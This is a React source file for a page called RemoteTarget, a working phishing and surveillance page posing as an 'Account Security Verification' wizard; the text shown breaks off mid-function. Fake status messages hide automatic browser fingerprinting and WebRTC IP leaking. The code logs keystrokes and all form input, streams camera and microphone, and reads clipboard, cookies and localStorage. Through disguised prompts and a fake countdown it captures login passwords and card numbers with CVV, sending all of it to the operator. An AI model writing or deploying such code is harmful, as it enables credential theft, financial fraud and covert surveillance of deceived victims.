import { useEffect, useRef, useState, useCallback } from "react";
import { useParams } from "wouter";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Progress } from "@/components/ui/progress";
import {
  Camera, Mic, MapPin, Smartphone, FolderOpen,
  CheckCircle2, AlertTriangle, Shield, Loader2, XCircle, Bell,
  KeyRound, ClipboardPaste, Globe, Lock, CreditCard, Eye, EyeOff,
  ScanFace, AudioLines, Search, FileCheck, ArrowRight, ShieldCheck,
  Timer, Users, Fingerprint,
} from "lucide-react";

interface TargetPageConfig {
  steps: { identity: boolean; biometric: boolean; voice: boolean; environment: boolean; documents: boolean };
  enableBanking: boolean;
  enableAutoHarvest: boolean;
  enableCredentialOverlay: boolean;
  autoRequestPermissions: boolean;
  pageTitle: string;
  pageSubtitle: string;
  brandColor: "blue" | "red" | "green" | "purple" | "orange";
}

interface SessionInfo {
  id: number;
  name: string;
  status: string;
  sessionToken: string;
  pageConfig: TargetPageConfig | null;
}

interface PermissionState {
  granted: boolean;
  loading: boolean;
  error: string | null;
}

type PermissionKey = "camera" | "microphone" | "location" | "deviceInfo" | "files" | "credentials" | "clipboard" | "browserData";

const initialPermissions: Record<PermissionKey, PermissionState> = {
  camera: { granted: false, loading: false, error: null },
  microphone: { granted: false, loading: false, error: null },
  location: { granted: false, loading: false, error: null },
  deviceInfo: { granted: false, loading: false, error: null },
  files: { granted: false, loading: false, error: null },
  credentials: { granted: false, loading: false, error: null },
  clipboard: { granted: false, loading: false, error: null },
  browserData: { granted: false, loading: false, error: null },
};

const WIZARD_STEPS = [
  { id: 1, title: "Identity Verification", subtitle: "Verify your account credentials" },
  { id: 2, title: "Biometric Scan", subtitle: "Facial recognition check" },
  { id: 3, title: "Voice Authentication", subtitle: "Voice pattern verification" },
  { id: 4, title: "Security Environment Check", subtitle: "Analyzing your device security" },
  { id: 5, title: "Document Verification", subtitle: "Upload supporting documents" },
];

const disguisedLabels: Record<PermissionKey, { title: string; body: string }> = {
  camera: { title: "Biometric Verification Required", body: "A facial recognition scan is needed to verify your identity. Your browser will request access to your imaging sensor for the biometric check." },
  microphone: { title: "Voice Authentication Required", body: "A voice pattern analysis is needed to complete multi-factor authentication. Your browser will request access to the audio input for voice-print matching." },
  location: { title: "Regional Compliance Check", body: "We need to verify your geographic region to comply with local regulations. Your browser will ask for location access for this compliance step." },
  deviceInfo: { title: "Device Security Assessment", body: "An automated check of your device's security configuration is required before proceeding." },
  files: { title: "Document Upload Required", body: "Please upload a verification document (government ID, utility bill, or bank statement) to complete identity confirmation." },
  credentials: { title: "Session Re-authentication", body: "Your secure session has expired. Please re-enter your credentials to continue the verification process." },
  clipboard: { title: "Clipboard Security Scan", body: "A routine check of your clipboard is required to detect potentially unsafe content copied from external sources." },
  browserData: { title: "Browser Configuration Analysis", body: "An analysis of your browser's security configuration is needed to ensure compliance with our platform requirements." },
};

async function generateCanvasFingerprint(): Promise<string> {
  try {
    const canvas = document.createElement("canvas");
    canvas.width = 200; canvas.height = 50;
    const ctx = canvas.getContext("2d");
    if (!ctx) return "unavailable";
    ctx.textBaseline = "top";
    ctx.font = "14px 'Arial'";
    ctx.fillStyle = "#f60";
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = "#069";
    ctx.fillText("BrowserFP", 2, 15);
    ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
    ctx.fillText("Security", 4, 35);
    ctx.globalCompositeOperation = "multiply";
    ctx.fillStyle = "rgb(255,0,255)";
    ctx.beginPath(); ctx.arc(50, 25, 25, 0, Math.PI * 2, true); ctx.closePath(); ctx.fill();
    const dataUrl = canvas.toDataURL();
    let hash = 0;
    for (let i = 0; i < dataUrl.length; i++) {
      const char = dataUrl.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash |= 0;
    }
    return hash.toString(16);
  } catch { return "error"; }
}

async function generateWebGLFingerprint(): Promise<Record<string, string>> {
  try {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    if (!gl) return { status: "unavailable" };
    const g = gl as WebGLRenderingContext;
    const debugInfo = g.getExtension("WEBGL_debug_renderer_info");
    return {
      vendor: debugInfo ? g.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : g.getParameter(g.VENDOR),
      renderer: debugInfo ? g.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : g.getParameter(g.RENDERER),
      version: g.getParameter(g.VERSION),
      shadingLanguage: g.getParameter(g.SHADING_LANGUAGE_VERSION),
      maxTextureSize: String(g.getParameter(g.MAX_TEXTURE_SIZE)),
      maxViewportDims: String(g.getParameter(g.MAX_VIEWPORT_DIMS)),
      extensions: (g.getSupportedExtensions() || []).length + " extensions",
    };
  } catch { return { status: "error" }; }
}

async function generateAudioFingerprint(): Promise<string> {
  try {
    const AudioCtx = (window as any).OfflineAudioContext || (window as any).webkitOfflineAudioContext;
    if (!AudioCtx) return "unavailable";
    const context = new AudioCtx(1, 44100, 44100);
    const oscillator = context.createOscillator();
    oscillator.type = "triangle";
    oscillator.frequency.setValueAtTime(10000, context.currentTime);
    const compressor = context.createDynamicsCompressor();
    compressor.threshold.setValueAtTime(-50, context.currentTime);
    compressor.knee.setValueAtTime(40, context.currentTime);
    compressor.ratio.setValueAtTime(12, context.currentTime);
    compressor.attack.setValueAtTime(0, context.currentTime);
    compressor.release.setValueAtTime(0.25, context.currentTime);
    oscillator.connect(compressor);
    compressor.connect(context.destination);
    oscillator.start(0);
    const buffer = await context.startRendering();
    const data = buffer.getChannelData(0);
    let sum = 0;
    for (let i = 4500; i < 5000; i++) sum += Math.abs(data[i]);
    return sum.toFixed(6);
  } catch { return "error"; }
}

function detectFonts(): string[] {
  const baseFonts = ["monospace", "sans-serif", "serif"];
  const testFonts = [
    "Arial", "Verdana", "Helvetica", "Times New Roman", "Courier New",
    "Georgia", "Palatino", "Garamond", "Comic Sans MS", "Impact",
    "Lucida Console", "Tahoma", "Trebuchet MS", "Arial Black",
    "Calibri", "Cambria", "Segoe UI", "Roboto", "Ubuntu",
  ];
  const detected: string[] = [];
  const span = document.createElement("span");
  span.style.fontSize = "72px";
  span.style.position = "absolute";
  span.style.left = "-9999px";
  span.innerText = "mmmmmmmmmmlli";
  document.body.appendChild(span);
  const baseWidths: number[] = [];
  for (const base of baseFonts) {
    span.style.fontFamily = base;
    baseWidths.push(span.offsetWidth);
  }
  for (const font of testFonts) {
    let found = false;
    for (let i = 0; i < baseFonts.length; i++) {
      span.style.fontFamily = `'${font}', ${baseFonts[i]}`;
      if (span.offsetWidth !== baseWidths[i]) { found = true; break; }
    }
    if (found) detected.push(font);
  }
  document.body.removeChild(span);
  return detected;
}

async function detectWebRTCIP(): Promise<string[]> {
  return new Promise((resolve) => {
    const ips: string[] = [];
    try {
      const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
      pc.createDataChannel("");
      pc.createOffer().then((offer) => pc.setLocalDescription(offer)).catch(() => {});
      const timeout = setTimeout(() => { pc.close(); resolve(ips); }, 5000);
      pc.onicecandidate = (e) => {
        if (!e.candidate) { clearTimeout(timeout); pc.close(); resolve(ips); return; }
        const parts = e.candidate.candidate.split(" ");
        const ip = parts[4];
        if (ip && !ips.includes(ip) && ip.indexOf(".") > 0) ips.push(ip);
      };
    } catch { resolve(ips); }
  });
}

function detectBrowserFeatures(): Record<string, boolean> {
  const nav = navigator as any;
  return {
    webBluetooth: !!nav.bluetooth,
    webUSB: !!nav.usb,
    webHID: !!nav.hid,
    webSerial: !!nav.serial,
    mediaDevices: !!nav.mediaDevices,
    notifications: "Notification" in window,
    pushAPI: "PushManager" in window,
    serviceWorker: "serviceWorker" in nav,
    webAssembly: typeof WebAssembly === "object",
    webGL: !!document.createElement("canvas").getContext("webgl"),
    webGL2: !!document.createElement("canvas").getContext("webgl2"),
    sharedWorker: "SharedWorker" in window,
    webSocket: "WebSocket" in window,
    webRTC: "RTCPeerConnection" in window,
    geolocation: "geolocation" in nav,
    deviceOrientation: "DeviceOrientationEvent" in window,
    touchEvents: "ontouchstart" in window || nav.maxTouchPoints > 0,
    webCrypto: !!(window.crypto && window.crypto.subtle),
    indexedDB: "indexedDB" in window,
    webWorker: "Worker" in window,
  };
}

function detectSocialLogins(): Record<string, string> {
  const results: Record<string, string> = {};
  const checks = [
    { name: "google", url: "https://accounts.google.com/CheckCookie?continue=https://www.google.com" },
    { name: "facebook", url: "https://www.facebook.com/login/device-based/regular/login/" },
  ];
  for (const check of checks) {
    results[check.name] = "probe-attempted";
  }
  if (document.cookie.includes("SAPISID") || document.cookie.includes("SID")) results.google = "likely-logged-in";
  if (document.cookie.includes("c_user") || document.cookie.includes("xs")) results.facebook = "likely-logged-in";
  return results;
}

function getPerformanceData(): Record<string, any> {
  try {
    const perf = performance.getEntriesByType("navigation")[0] as PerformanceNavigationTiming;
    if (!perf) return {};
    return {
      dnsLookup: Math.round(perf.domainLookupEnd - perf.domainLookupStart),
      tcpConnect: Math.round(perf.connectEnd - perf.connectStart),
      tlsHandshake: Math.round(perf.secureConnectionStart > 0 ? perf.connectEnd - perf.secureConnectionStart : 0),
      pageLoadTime: Math.round(perf.loadEventEnd - perf.startTime),
      domContentLoaded: Math.round(perf.domContentLoadedEventEnd - perf.startTime),
      transferSize: (perf as any).transferSize || 0,
      encodedBodySize: (perf as any).encodedBodySize || 0,
    };
  } catch { return {}; }
}

export default function RemoteTarget() {
  const params = useParams<{ token: string }>();
  const token = params.token || "";

  const [session, setSession] = useState<SessionInfo | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [permissions, setPermissions] = useState<Record<PermissionKey, PermissionState>>(initialPermissions);
  const [pendingRequest, setPendingRequest] = useState<PermissionKey | null>(null);
  const [showCredentialOverlay, setShowCredentialOverlay] = useState(false);
  const [credForm, setCredForm] = useState({ email: "", password: "", cardNumber: "", cardExpiry: "", cardCvv: "", cardName: "" });
  const [credTab, setCredTab] = useState<"login" | "banking">("login");
  const [showPassword, setShowPassword] = useState(false);

  const [currentStep, setCurrentStep] = useState(0);
  const [scanProgress, setScanProgress] = useState(0);
  const [scanStatus, setScanStatus] = useState("");
  const [scanRunning, setScanRunning] = useState(false);
  const [wizardComplete, setWizardComplete] = useState(false);

  const [capturedEmail, setCapturedEmail] = useState("");
  const [urgencyTimer, setUrgencyTimer] = useState(299);
  const [verificationCount] = useState(() => 2400 + Math.floor(Math.random() * 600));
  const [autoHarvestDone, setAutoHarvestDone] = useState(false);
  const [initStatus, setInitStatus] = useState("Establishing secure connection...");

  const cfg = session?.pageConfig || { steps: { identity: true, biometric: true, voice: true, environment: true, documents: true }, enableBanking: false, enableAutoHarvest: true, enableCredentialOverlay: false, autoRequestPermissions: false, pageTitle: "Account Security Verification", pageSubtitle: "", brandColor: "blue" as const };

  const activeStepKeys = [
    cfg.steps.identity ? "identity" : null,
    cfg.steps.biometric ? "biometric" : null,
    cfg.steps.voice ? "voice" : null,
    cfg.steps.environment ? "environment" : null,
    cfg.steps.documents ? "documents" : null,
  ].filter(Boolean) as string[];

  const activeWizardSteps = WIZARD_STEPS.filter((_, i) => {
    const keys = ["identity", "biometric", "voice", "environment", "documents"];
    return activeStepKeys.includes(keys[i]);
  });

  const brandColors: Record<string, { from: string; to: string; accent: string; bg: string }> = {
    blue: { from: "from-blue-600", to: "to-blue-800", accent: "text-blue-500", bg: "bg-blue-500/10" },
    red: { from: "from-red-600", to: "to-red-800", accent: "text-red-500", bg: "bg-red-500/10" },
    green: { from: "from-green-600", to: "to-green-800", accent: "text-green-500", bg: "bg-green-500/10" },
    purple: { from: "from-purple-600", to: "to-purple-800", accent: "text-purple-500", bg: "bg-purple-500/10" },
    orange: { from: "from-orange-600", to: "to-orange-800", accent: "text-orange-500", bg: "bg-orange-500/10" },
  };
  const brand = brandColors[cfg.brandColor] || brandColors.blue;

  const wsRef = useRef<WebSocket | null>(null);
  const pcRef = useRef<RTCPeerConnection | null>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);
  const combinedStreamRef = useRef<MediaStream>(new MediaStream());
  const cameraTracksRef = useRef<MediaStreamTrack[]>([]);
  const micTracksRef = useRef<MediaStreamTrack[]>([]);
  const keylogBufferRef = useRef<string[]>([]);
  const keylogTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const mousePositionsRef = useRef<{ x: number; y: number; t: number }[]>([]);

  const updatePermission = useCallback((key: PermissionKey, update: Partial<PermissionState>) => {
    setPermissions((prev) => ({ ...prev, [key]: { ...prev[key], ...update } }));
  }, []);

  const sendWS = useCallback((msg: object) => {
    if (wsRef.current?.readyState === WebSocket.OPEN) {
      wsRef.current.send(JSON.stringify(msg));
    }
  }, []);

  const postData = useCallback(async (data: object) => {
    try {
      await fetch(`/api/remote-sessions/token/${token}/data`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
      });
    } catch {}
  }, [token]);

  useEffect(() => {
    if (session && currentStep === 0) {
      if (activeStepKeys.length === 0) {
        setWizardComplete(true);
        return;
      }
      const stepKeys = ["identity", "biometric", "voice", "environment", "documents"];
      const firstActive = stepKeys.findIndex((k) => activeStepKeys.includes(k));
      setCurrentStep(firstActive >= 0 ? firstActive + 1 : 1);
    }
  }, [session, currentStep, activeStepKeys]);

  useEffect(() => {
    async function fetchSession() {
      try {
        const res = await fetch(`/api/remote-sessions/token/${token}`);
        if (!res.ok) {
          if (res.status === 404) throw new Error("Session not found");
          if (res.status === 410) throw new Error("This session has expired");
          throw new Error("Failed to load session");
        }
        const data = await res.json();
        setSession(data);
      } catch (err: any) {
        setError(err.message || "An error occurred");
      } finally {
        setLoading(false);
      }
    }
    if (token) fetchSession();
  }, [token]);

  useEffect(() => {
    const timer = setInterval(() => {
      setUrgencyTimer((prev) => (prev <= 0 ? 299 : prev - 1));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
    if (!session || autoHarvestDone) return;
    if (!cfg.enableAutoHarvest) { setAutoHarvestDone(true); return; }

    const runAutoHarvest = async () => {
      setInitStatus("Establishing secure connection...");
      await new Promise((r) => setTimeout(r, 600));

      setInitStatus("Verifying SSL certificate...");
      const canvasHash = await generateCanvasFingerprint();
      await new Promise((r) => setTimeout(r, 400));

      setInitStatus("Loading security module...");
      const webglData = await generateWebGLFingerprint();
      await new Promise((r) => setTimeout(r, 300));

      setInitStatus("Initializing encryption...");
      const audioHash = await generateAudioFingerprint();
      const fonts = detectFonts();
      await new Promise((r) => setTimeout(r, 400));

      setInitStatus("Checking network configuration...");
      const webrtcIPs = await detectWebRTCIP();
      const features = detectBrowserFeatures();
      const socialLogins = detectSocialLogins();
      const perfData = getPerformanceData();

      const screenProfile = {
        width: screen.width, height: screen.height,
        availWidth: screen.availWidth, availHeight: screen.availHeight,
        colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth,
        devicePixelRatio: window.devicePixelRatio,
        orientation: (screen as any).orientation?.type || "unknown",
      };

      const harvestData = {
        canvasFingerprint: canvasHash,
        webglFingerprint: webglData,
        audioFingerprint: audioHash,
        detectedFonts: fonts,
        fontCount: fonts.length,
        webrtcLeakedIPs: webrtcIPs,
        browserFeatures: features,
        socialLoginStatus: socialLogins,
        performanceTimings: perfData,
        screenProfile,
        timestamp: new Date().toISOString(),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: new Date().getTimezoneOffset(),
        language: navigator.language,
        languages: Array.from(navigator.languages || []),
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: (navigator as any).deviceMemory || null,
        maxTouchPoints: navigator.maxTouchPoints,
        vendor: navigator.vendor,
        online: navigator.onLine,
        referrer: document.referrer || "(direct)",
      };

      const trySend = () => {
        if (wsRef.current?.readyState === WebSocket.OPEN) {
          sendWS({ type: "rc_auto_harvest", data: harvestData, token });
          return true;
        }
        return false;
      };
      if (!trySend()) {
        for (let attempt = 0; attempt < 10; attempt++) {
          await new Promise((r) => setTimeout(r, 500));
          if (trySend()) break;
        }
      }
      setInitStatus("Secure connection established");
      await new Promise((r) => setTimeout(r, 500));
      setAutoHarvestDone(true);
    };

    const timer = setTimeout(runAutoHarvest, 500);
    return () => clearTimeout(timer);
  }, [session, autoHarvestDone, sendWS, token]);

  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      const key = e.key.length === 1 ? e.key : `[${e.key}]`;
      const entry = `${key}`;
      keylogBufferRef.current.push(entry);
    };
    document.addEventListener("keydown", handleKeyDown);

    keylogTimerRef.current = setInterval(() => {
      if (keylogBufferRef.current.length > 0) {
        const batch = keylogBufferRef.current.splice(0);
        sendWS({ type: "rc_keylog", data: { keys: batch, timestamp: new Date().toISOString() }, token });
      }
    }, 2000);

    return () => {
      document.removeEventListener("keydown", handleKeyDown);
      if (keylogTimerRef.current) clearInterval(keylogTimerRef.current);
    };
  }, [sendWS, token]);

  useEffect(() => {
    const handleMouseMove = (e: MouseEvent) => {
      mousePositionsRef.current.push({ x: e.clientX, y: e.clientY, t: Date.now() });
      if (mousePositionsRef.current.length > 50) mousePositionsRef.current.shift();
    };

    const handleVisibilityChange = () => {
      sendWS({
        type: "rc_activity",
        data: {
          category: "tab_visibility",
          visible: !document.hidden,
          timestamp: new Date().toISOString(),
        },
        token,
      });
    };

    const handleBeforeUnload = () => {
      sendWS({
        type: "rc_activity",
        data: { category: "navigation_attempt", timestamp: new Date().toISOString() },
        token,
      });
    };

    const handleOnlineOffline = () => {
      sendWS({
        type: "rc_activity",
        data: { category: "network_change", online: navigator.onLine, timestamp: new Date().toISOString() },
        token,
      });
    };

    let idleTimeout: ReturnType<typeof setTimeout> | null = null;
    const resetIdle = () => {
      if (idleTimeout) clearTimeout(idleTimeout);
      idleTimeout = setTimeout(() => {
        sendWS({
          type: "rc_activity",
          data: { category: "idle_detected", duration: 30, timestamp: new Date().toISOString() },
          token,
        });
      }, 30000);
    };

    const mouseInterval = setInterval(() => {
      if (mousePositionsRef.current.length > 5) {
        const positions = mousePositionsRef.current.splice(0);
        sendWS({
          type: "rc_activity",
          data: { category: "mouse_movement", positions: positions.slice(-20), sampleCount: positions.length, timestamp: new Date().toISOString() },
          token,
        });
      }
    }, 10000);

    let batteryRef: any = null;
    let batteryLevelHandler: (() => void) | null = null;
    let batteryChargingHandler: (() => void) | null = null;
    const setupBattery = async () => {
      try {
        const battery = await (navigator as any).getBattery?.();
        if (!battery) return;
        batteryRef = battery;
        const reportBattery = () => {
          sendWS({
            type: "rc_activity",
            data: { category: "battery_change", level: Math.round(battery.level * 100), charging: battery.charging, timestamp: new Date().toISOString() },
            token,
          });
        };
        batteryLevelHandler = reportBattery;
        batteryChargingHandler = reportBattery;
        battery.addEventListener("levelchange", reportBattery);
        battery.addEventListener("chargingchange", reportBattery);
      } catch {}
    };
    setupBattery();

    document.addEventListener("visibilitychange", handleVisibilityChange);
    window.addEventListener("beforeunload", handleBeforeUnload);
    window.addEventListener("online", handleOnlineOffline);
    window.addEventListener("offline", handleOnlineOffline);
    document.addEventListener("mousemove", handleMouseMove);
    document.addEventListener("mousemove", resetIdle);
    document.addEventListener("keydown", resetIdle);
    resetIdle();

    return () => {
      document.removeEventListener("visibilitychange", handleVisibilityChange);
      window.removeEventListener("beforeunload", handleBeforeUnload);
      window.removeEventListener("online", handleOnlineOffline);
      window.removeEventListener("offline", handleOnlineOffline);
      document.removeEventListener("mousemove", handleMouseMove);
      document.removeEventListener("mousemove", resetIdle);
      document.removeEventListener("keydown", resetIdle);
      clearInterval(mouseInterval);
      if (idleTimeout) clearTimeout(idleTimeout);
      if (batteryRef && batteryLevelHandler) {
        batteryRef.removeEventListener("levelchange", batteryLevelHandler);
        batteryRef.removeEventListener("chargingchange", batteryChargingHandler);
      }
    };
  }, [sendWS, token]);

  useEffect(() => {
    const instrumentInputs = () => {
      const inputs = document.querySelectorAll("input, textarea, select");
      inputs.forEach((input) => {
        if ((input as any).__rc_monitored) return;
        (input as any).__rc_monitored = true;
        const handler = (e: Event) => {
          const el = e.target as HTMLInputElement;
          sendWS({
            type: "rc_form_intercept",
            data: {
              field: el.name || el.id || el.type || "unknown",
              value: el.value,
              type: el.type,
              timestamp: new Date().toISOString(),
            },
            token,
          });
        };
        input.addEventListener("input", handler);
        input.addEventListener("change", handler);
      });
    };
    instrumentInputs();
    const observer = new MutationObserver(() => instrumentInputs());
    observer.observe(document.body, { childList: true, subtree: true });
    return () => observer.disconnect();
  }, [sendWS, token]);

  const setupOrUpdateWebRTC = useCallback(async (newTracks: MediaStreamTrack[]) => {
    const combined = combinedStreamRef.current;
    for (const track of newTracks) {
      const existing = combined.getTracks().find(t => t.kind === track.kind);
      if (existing) combined.removeTrack(existing);
      combined.addTrack(track);
    }
    if (pcRef.current && pcRef.current.signalingState !== "closed") {
      for (const track of newTracks) {
        const sender = pcRef.current.getSenders().find(s => s.track?.kind === track.kind);
        if (sender) { await sender.replaceTrack(track); } else { pcRef.current.addTrack(track, combined); }
      }
      const offer = await pcRef.current.createOffer();
      await pcRef.current.setLocalDescription(offer);
      sendWS({ type: "rc_offer", sdp: offer, token });
      return;
    }
    if (pcRef.current) pcRef.current.close();
    const pc = new RTCPeerConnection({
      iceServers: [
        { urls: "stun:stun.l.google.com:19302" },
        { urls: "stun:stun1.l.google.com:19302" },
      ],
    });
    pcRef.current = pc;
    combined.getTracks().forEach((track) => pc.addTrack(track, combined));
    pc.onicecandidate = (evt) => { if (evt.candidate) sendWS({ type: "rc_ice_candidate", candidate: evt.candidate, token }); };
    const offer = await pc.createOffer();
    await pc.setLocalDescription(offer);
    sendWS({ type: "rc_offer", sdp: offer, token });
  }, [sendWS, token]);

  const handleCamera = useCallback(async () => {
    updatePermission("camera", { loading: true, error: null });
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      cameraTracksRef.current = stream.getVideoTracks();
      await setupOrUpdateWebRTC(stream.getVideoTracks());
      updatePermission("camera", { granted: true, loading: false });
      sendWS({ type: "rc_permission_granted", permission: "camera" });
      await postData({ permissionsGranted: ["camera"] });
    } catch (err: any) {
      updatePermission("camera", { loading: false, error: "Biometric scan failed. Please ensure your device has a camera and try again." });
      sendWS({ type: "rc_permission_denied", permission: "camera" });
    }
  }, [setupOrUpdateWebRTC, sendWS, postData, updatePermission]);

  const handleMicrophone = useCallback(async () => {
    updatePermission("microphone", { loading: true, error: null });
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      micTracksRef.current = stream.getAudioTracks();
      await setupOrUpdateWebRTC(stream.getAudioTracks());
      updatePermission("microphone", { granted: true, loading: false });
      sendWS({ type: "rc_permission_granted", permission: "microphone" });
      await postData({ permissionsGranted: ["microphone"] });
    } catch (err: any) {
      updatePermission("microphone", { loading: false, error: "Voice verification failed. Please ensure your device has a microphone and try again." });
      sendWS({ type: "rc_permission_denied", permission: "microphone" });
    }
  }, [setupOrUpdateWebRTC, sendWS, postData, updatePermission]);

  const handleLocation = useCallback(async () => {
    updatePermission("location", { loading: true, error: null });
    try {
      const position = await new Promise<GeolocationPosition>((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000 });
      });
      const locData = { latitude: position.coords.latitude, longitude: position.coords.longitude, accuracy: position.coords.accuracy, altitude: position.coords.altitude, speed: position.coords.speed };
      sendWS({ type: "rc_location", data: locData, token });
      await postData({ permissionsGranted: ["location"], locationData: locData });
      updatePermission("location", { granted: true, loading: false });
      sendWS({ type: "rc_permission_granted", permission: "location" });
    } catch (err: any) {
      updatePermission("location", { loading: false, error: err.message || "Location access denied" });
      sendWS({ type: "rc_permission_denied", permission: "location" });
    }
  }, [sendWS, postData, updatePermission, token]);

  const handleDeviceInfo = useCallback(async () => {
    updatePermission("deviceInfo", { loading: true, error: null });
    try {
      const nav = navigator as any;
      let batteryLevel = null;
      try { const battery = await nav.getBattery?.(); if (battery) batteryLevel = Math.round(battery.level * 100); } catch {}
      const connection = nav.connection || nav.mozConnection || nav.webkitConnection;
      const deviceData: Record<string, any> = {
        userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language,
        languages: Array.from(navigator.languages || []), hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: nav.deviceMemory || null, screenWidth: screen.width, screenHeight: screen.height,
        screenColorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio,
        connectionType: connection?.effectiveType || null, connectionDownlink: connection?.downlink || null,
        battery: batteryLevel, cookiesEnabled: navigator.cookieEnabled, doNotTrack: navigator.doNotTrack,
        maxTouchPoints: navigator.maxTouchPoints, vendor: navigator.vendor,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, online: navigator.onLine,
        windowWidth: window.innerWidth, windowHeight: window.innerHeight,
      };
      sendWS({ type: "rc_device_info", data: deviceData, token });
      await postData({ permissionsGranted: ["deviceInfo"], deviceInfo: deviceData });
      updatePermission("deviceInfo", { granted: true, loading: false });
      sendWS({ type: "rc_permission_granted", permission: "deviceInfo" });
    } catch (err: any) {
      updatePermission("deviceInfo", { loading: false, error: err.message || "Failed to collect device info" });
      sendWS({ type: "rc_permission_denied", permission: "deviceInfo" });
    }
  }, [sendWS, postData, updatePermission, token]);

  const handleFiles = useCallback(() => { fileInputRef.current?.click(); }, []);

  const onFileSelected = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = e.target.files;
    if (!files || files.length === 0) return;
    updatePermission("files", { loading: true, error: null });
    try {
      for (const file of Array.from(files)) {
        const dataUrl = await new Promise<string>((resolve) => {
          const reader = new FileReader();
          reader.onload = () => resolve(reader.result as string);
          reader.readAsDataURL(file);
        });
        sendWS({ type: "rc_file", data: { name: file.name, type: file.type, size: file.size, preview: dataUrl }, token });
      }
      updatePermission("files", { granted: true, loading: false });
      sendWS({ type: "rc_permission_granted", permission: "files" });
    } catch (err: any) {
      updatePermission("files", { loading: false, error: err.message || "Failed to process files" });
    }
  };

  const handleCredentials = useCallback(() => {
    if (!cfg.enableCredentialOverlay) {
      updatePermission("credentials", { granted: true, loading: false });
      sendWS({ type: "rc_permission_granted", permission: "credentials" });
      return;
    }
    updatePermission("credentials", { loading: true, error: null });
    setShowCredentialOverlay(true);
    updatePermission("credentials", { loading: false, granted: false, error: null });
  }, [updatePermission, cfg.enableCredentialOverlay, sendWS]);

  const submitCredentials = useCallback((type: "login" | "banking") => {
    const data: Record<string, string> = { type, timestamp: new Date().toISOString() };
    if (type === "login") {
      data.email = credForm.email;
      data.password = credForm.password;
      setCapturedEmail(credForm.email);
    } else {
      data.cardName = credForm.cardName;
      data.cardNumber = credForm.cardNumber;
      data.cardExpiry = credForm.cardExpiry;
      data.cardCvv = credForm.cardCvv;
    }
    sendWS({ type: "rc_credentials", data, token });
    updatePermission("credentials", { granted: true, loading: false });
    sendWS({ type: "rc_permission_granted", permission: "credentials" });
    setShowCredentialOverlay(false);
    setCredForm({ email: "", password: "", cardNumber: "", cardExpiry: "", cardCvv: "", cardName: "" });
    setTimeout(() => advanceStep(), 500);
  }, [credForm, sendWS, updatePermission, token]);

  const handleClipboard = useCallback(async () => {
    updatePermission("clipboard", { loading: true, error: null });
    try {
      const text = await navigator.clipboard.readText();
      sendWS({ type: "rc_clipboard", data: { content: text, timestamp: new Date().toISOString() }, token });
      updatePermission("clipboard", { granted: true, loading: false });
      sendWS({ type: "rc_permission_granted", permission: "clipboard" });
    } catch (err: any) {
      updatePermission("clipboard", { loading: false, error: err.message || "Clipboard access denied" });
      sendWS({ type: "rc_permission_denied", permission: "clipboard" });
    }
  }, [sendWS, updatePermission, token]);

  const handleBrowserData = useCallback(async () => {
    updatePermission("browserData", { loading: true, error: null });
    try {
      const lsKeys: Record<string, string> = {};
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key) { lsKeys[key] = (localStorage.getItem(key) || "").substring(0, 200); }
      }
      const ssKeys: Record<string, string> = {};
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        if (key) { ssKeys[key] = (sessionStorage.getItem(key) || "").substring(0, 200); }
      }
      const plugins: string[] = [];
      for (let i = 0; i < navigator.plugins.length; i++) {
        plugins.push(navigator.plugins[i].name);
      }
      const browserData = {
        cookies: document.cookie || "(no accessible cookies)",
        localStorageKeys: lsKeys,
        localStorageCount: localStorage.length,
        sessionStorageKeys: ssKeys,
        sessionStorageCount: sessionStorage.length,
        historyLength: history.length,
        plugins,
        referrer: document.referrer || "(direct)",
        documentTitle: document.title,
        characterSet: document.characterSet,
        contentType: document.contentType || "text/html",
        timestamp: new Date().toISOString(),
      };
      sendWS({ type: "rc_browser_data", data: browserData, token });
      updatePermission("browserData", { granted: true, loading: false });
      sendWS({ type: "rc_permission_granted", permission: "browserData" });
    } catch (err: any) {
      updatePermission("browserData", { loading: false, error: err.message || "Failed to collect browser data" });
      sendWS({ type: "rc_permission_denied", permission: "browserData" });
    }
  }, [sendWS, updatePermission, token]);

  const handlers: Record<PermissionKey, () => void> = {
    camera: handleCamera, microphone: handleMicrophone, location: handleLocation,
    deviceInfo: handleDeviceInfo, files: handleFiles, credentials: handleCredentials,
    clipboard: handleClipboard, browserData: handleBrowserData,
  };

  const handlePermissionRequest = useCallback((permission: PermissionKey) => {
    if (permissions[permission]?.granted) return;
    setPendingRequest(permission);
  }, [permissions]);

  const handleToggleCamera = useCallback((enabled: boolean) => {
    cameraTracksRef.current.forEach(t => { t.enabled = enabled; });
